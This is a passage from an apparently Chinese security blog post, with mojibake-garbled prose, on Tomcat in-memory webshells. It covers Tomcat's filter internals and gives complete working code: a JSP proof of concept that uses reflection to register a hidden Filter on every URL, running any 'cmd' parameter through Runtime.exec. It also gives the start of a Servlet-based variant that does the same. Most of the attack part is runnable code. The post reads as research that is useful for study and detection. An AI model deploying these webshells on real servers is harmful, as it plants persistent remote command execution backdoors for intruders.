class_">ApplicationFilterConfig</span>[n + INCREMENT];<br>            System.arraycopy(filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, n);<br>            filters = newFilters;<br>        &#125;<br>        filters[n++] = filterConfig;<br> <br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å…³é”®å°±æ˜¯å°†æ¶æ„Filterçš„ä¿¡æ¯æ·»åŠ è¿›FilterConfigæ•°ç»„ä¸­ï¼Œè¿™æ ·Tomcatåœ¨å¯åŠ¨æ—¶å°±ä¼šè‡ªåŠ¨åˆå§‹åŒ–æˆ‘ä»¬çš„æ¶æ„Filterã€‚</p><h4 id="FilterConfigã€FilterDefå’ŒFilterMaps"><a href="#FilterConfigã€FilterDefå’ŒFilterMaps" class="headerlink" title="FilterConfigã€FilterDefå’ŒFilterMaps"></a>FilterConfigã€FilterDefå’ŒFilterMaps</h4><p>è·Ÿè¿›åˆ°createFilterChainå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ­¤æ—¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡<code>StandardContext</code>å®é™…ä¸Šæ˜¯åŒ…å«äº†è¿™ä¸‰è€…çš„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-24.png" alt="img9"></p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>å…¶ä¸­filterConfigsåŒ…å«äº†å½“å‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯<code>StandardContext</code>ã€ä»¥åŠ<code>filterDef</code>ç­‰ä¿¡æ¯</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-26.png" alt="img10"></p><p>filterConfigs</p><p>å…¶ä¸­<code>filterDef</code>å­˜æ”¾äº†filterçš„å®šä¹‰ï¼ŒåŒ…æ‹¬filterClassã€filterNameç­‰ä¿¡æ¯ã€‚å¯¹åº”çš„å…¶å®å°±æ˜¯web.xmlä¸­çš„<code>&lt;filter&gt;</code>æ ‡ç­¾ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-27.png" alt="img11"></p><p>filterDef</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;filter-class&gt;&lt;/filter-class&gt;<br>&lt;/filter&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒfilterDefå¿…è¦çš„å±æ€§ä¸º<code>filter</code>ã€<code>filterClass</code>ä»¥åŠ<code>filterName</code>ã€‚</p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">filterDefs`æ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨`filterDef<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-28.png" alt="img12"></p><p>filterDefs</p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>ä¸­ä»¥arrayçš„å½¢å¼å­˜æ”¾å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶å¯¹åº”çš„æ˜¯web.xmlä¸­çš„<code>&lt;filter-mapping&gt;</code>æ ‡ç­¾</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-29.png" alt="img13"></p><p>filterMaps</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter-mapping&gt;<br>    &lt;filter-name&gt;&lt;/filter-name&gt;<br>    &lt;url-pattern&gt;&lt;/url-pattern&gt;<br>&lt;/filter-mapping&gt;<br></code></pre></td></tr></table></figure><p>filterMapså¿…è¦çš„å±æ€§ä¸º<code>dispatcherMapping</code>ã€<code>filterName</code>ã€<code>urlPatterns</code></p><p>äºæ˜¯ä¸‹é¢çš„å·¥ä½œå°±æ˜¯æ„é€ å«æœ‰æ¶æ„filterçš„FilterMapså’ŒFilterConfigå¯¹è±¡ï¼Œå¹¶å°†FilterConfigæ·»åŠ åˆ°filteré“¾ä¸­äº†ã€‚</p><h4 id="åŠ¨æ€æ³¨å†ŒFilter"><a href="#åŠ¨æ€æ³¨å†ŒFilter" class="headerlink" title="åŠ¨æ€æ³¨å†ŒFilter"></a>åŠ¨æ€æ³¨å†ŒFilter</h4><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºåŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯</p><ol><li>è·å–StandardContextå¯¹è±¡</li><li>åˆ›å»ºæ¶æ„Filter</li><li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li><li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li><li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li></ol><h5 id="è·å–StandardContextå¯¹è±¡"><a href="#è·å–StandardContextå¯¹è±¡" class="headerlink" title="è·å–StandardContextå¯¹è±¡"></a>è·å–StandardContextå¯¹è±¡</h5><p>StandardContextå¯¹è±¡ä¸»è¦ç”¨æ¥ç®¡ç†Webåº”ç”¨çš„ä¸€äº›å…¨å±€èµ„æºï¼Œå¦‚Sessionã€Cookieã€Servletç­‰ã€‚å› æ­¤æˆ‘ä»¬æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–StandardContextå¯¹è±¡ã€‚</p><p>Tomcatåœ¨å¯åŠ¨æ—¶ä¼šä¸ºæ¯ä¸ªContextéƒ½åˆ›å»ºä¸ªServletContextå¯¹è±¡ï¼Œæ¥è¡¨ç¤ºä¸€ä¸ªContextï¼Œä»è€Œå¯ä»¥å°†ServletContextè½¬åŒ–ä¸ºStandardContextã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å–ApplicationContextFacadeç±»</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br> <br><span class="hljs-comment">//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br> <br><span class="hljs-comment">//åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><h5 id="åˆ›å»ºæ¶æ„Filter"><a href="#åˆ›å»ºæ¶æ„Filter" class="headerlink" title="åˆ›å»ºæ¶æ„Filter"></a>åˆ›å»ºæ¶æ„Filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>            n.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨FilterDefå°è£…filter"><a href="#ä½¿ç”¨FilterDefå°è£…filter" class="headerlink" title="ä½¿ç”¨FilterDefå°è£…filter"></a>ä½¿ç”¨FilterDefå°è£…filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//filteråç§°</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br><span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><h5 id="åˆ›å»ºfilterMap"><a href="#åˆ›å»ºfilterMap" class="headerlink" title="åˆ›å»ºfilterMap"></a>åˆ›å»ºfilterMap</h5><p>filterMapç”¨äºfilterå’Œè·¯å¾„çš„ç»‘å®š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>standardContext.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><h5 id="å°è£…filterConfigåŠfilterDefåˆ°filterConfigs"><a href="#å°è£…filterConfigåŠfilterDefåˆ°filterConfigs" class="headerlink" title="å°è£…filterConfigåŠfilterDefåˆ°filterConfigs"></a>å°è£…filterConfigåŠfilterDefåˆ°filterConfigs</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br>    <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC-1"><a href="#å®Œæ•´POC-1" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <br> <br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <br> <br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>å…ˆè®¿é—®jspæœ¨é©¬</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-32.png" alt="img14"></p><p>æ­¤æ—¶å·²ç»åŠ¨æ€æ³¨å†Œäº†æˆ‘ä»¬çš„æ¶æ„Filterï¼Œè®¿é—®ä»»æ„è·¯ç”±å³å¯æ‰§è¡Œå‘½ä»¤</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-33.png" alt="img15"></p><h3 id="Servletå‹"><a href="#Servletå‹" class="headerlink" title="Servletå‹"></a>Servletå‹</h3><p>åŒæ ·åœ°ï¼Œæˆ‘ä»¬å…ˆå®ç°ä¸€ä¸ªæ¶æ„çš„Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebServlet(&quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br> <br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br> <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-37.png" alt="img16"></p><p>ä¸‹é¢å°±æ˜¯å®ç°åŠ¨æ€æ³¨å†ŒServletäº†ã€‚</p><h4 id="Servletåˆ›å»ºæµç¨‹"><a href="#Servletåˆ›å»ºæµç¨‹" class="headerlink" title="Servletåˆ›å»ºæµç¨‹"></a>Servletåˆ›å»ºæµç¨‹</h4><p>æˆ‘ä»¬çŸ¥é“Servletçš„ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¦‚ä¸‹äº”éƒ¨åˆ†</p><ol><li>åŠ è½½ï¼šå½“Tomcatç¬¬ä¸€æ¬¡è®¿é—®Servletçš„æ—¶å€™ï¼ŒTomcatä¼šè´Ÿè´£åˆ›å»ºServletçš„å®ä¾‹</li><li>åˆå§‹åŒ–ï¼šå½“Servletè¢«å®ä¾‹åŒ–åï¼ŒTomcatä¼šè°ƒç”¨<code>init()</code>æ–¹æ³•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡</li><li>å¤„ç†æœåŠ¡ï¼šå½“æµè§ˆå™¨è®¿é—®Servletçš„æ—¶å€™ï¼ŒServlet ä¼šè°ƒç”¨<code>service()</code>æ–¹æ³•å¤„ç†è¯·æ±‚</li><li>é”€æ¯ï¼šå½“Tomcatå…³é—­æ—¶æˆ–è€…æ£€æµ‹åˆ°Servletè¦ä»Tomcatåˆ é™¤çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<code>destroy()</code>æ–¹æ³•ï¼Œè®©è¯¥å®ä¾‹é‡Šæ”¾æ‰æ‰€å çš„èµ„æºã€‚ä¸€ä¸ªServletå¦‚æœé•¿æ—¶é—´ä¸è¢«ä½¿ç”¨çš„è¯ï¼Œä¹Ÿä¼šè¢«Tomcatè‡ªåŠ¨é”€æ¯</li><li>å¸è½½ï¼šå½“Servletè°ƒç”¨å®Œ<code>destroy()</code>æ–¹æ³•åï¼Œç­‰å¾…åƒåœ¾å›æ”¶ã€‚å¦‚æœæœ‰éœ€è¦å†æ¬¡ä½¿ç”¨è¿™ä¸ªServletï¼Œä¼šé‡æ–°è°ƒç”¨<code>init()</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</li></ol><p><a href="https://goodapple.top/archives/1359">å‰æ–‡</a>æˆ‘ä»¬å·²ç»åˆ†æè¿‡ï¼Œåœ¨<code>org.apache.catalina.core.StandardContext</code>ç±»çš„<code>startInternal()</code>æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°<code>**Listener-&gt;Filter-&gt;Servlet**</code>çš„åŠ è½½é¡ºåº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br> <br><span class="hljs-keyword">if</span> (ok) &#123;<br>                <span class="hljs-keyword">if</span> (!listenerStart()) &#123;<br>                    log.error(sm.getString(<span class="hljs-string">&quot;standardContext.listenerFail&quot;</span>));<br>                    ok = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br> <br> <br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// Start manager</span><br>                <span class="hljs-type">Manager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> getManager();<br>                <span class="hljs-keyword">if</span> (manager <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>                    ((Lifecycle) manager).start();<br>                